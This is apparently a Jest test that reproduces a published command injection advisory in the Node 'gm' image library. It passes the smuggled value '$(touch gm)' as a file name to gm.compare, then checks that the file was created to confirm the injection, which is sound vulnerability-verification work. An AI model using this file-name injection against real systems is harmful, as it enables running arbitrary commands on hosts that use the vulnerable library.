//https://github.com/advisories/GHSA-pjh3-jv7w-9jpr
test("Command Injection in gm", () => 
{
	const gm = require('gm');
	const fs = require('fs');
	const path = './gm';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	gm.compare('$(touch gm)', '/path/to/another.png', function (err, isEqual, equality, raw, path1, path2) {});
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});